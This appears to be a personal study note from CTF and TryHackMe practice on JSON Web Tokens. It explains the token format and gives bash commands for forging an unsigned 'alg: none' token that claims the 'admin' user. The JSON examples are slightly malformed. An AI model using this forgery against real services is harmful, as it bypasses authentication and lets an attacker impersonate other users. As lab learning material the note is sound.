# JSON Web Tokens

[[JSON]]

Common Terms | Description/Human Readable
--- | --- 
`nbf <epoch>` |Not before
`exp` | expires

It vulnerable is misconfigured as Data Integrity Failure - see [[OWASP-Top-10-Historic-Definitions]] 

JSON Web Tokens [https://jwt.io/](https://jwt.io/). These are JSON base64 encoded  chunks delimited by dots. 
```json
{
	// Header
	"type":"JWT"
	"alg":"none"
}

{
	// Payload
	"username":"admin"
	"exp":"1234567890"
}

// signature is the signing algorithm used in "alg":
...

// go from 
{HEADER}.{PAYLOAD}.SIGNATURE
// To - do not forget the final dot if you set the signing algorithm to none parser will still expect the .
{HEADER}.{PAYLOAD}.
```

Workflow - Add a space in plain text payloads to bypass base64 encoded payloads have `+` that denote a space between a dangerous character. Avoid it being URL encoded to a URL encoded `+` character and breaking the base64.
```bash
# copy into a file
cat cookie | awk -F. '{print $1}' | base64 -d
cat cookie | awk -F. '{print $2}' | base64 -d

# Then given the fields of the json 
# beware of escaping the quotations in Json 
echo "{\"typ\":\"JWT\",\"alg\":\"none\"}" | base64 | tr -d '=' && echo "{\"username\":\"admin\",\"exp\":1687860563}" | base64 | tr -d '='

# Piece together with two dots
$1.$2.
```


## Reference

[https://jwt.io/](https://jwt.io/)
[THM OWASP TOP 10 2021 Room](https://tryhackme.com/room/owasptop102021)
[Ippsec Rocks](https://ippsec.rocks)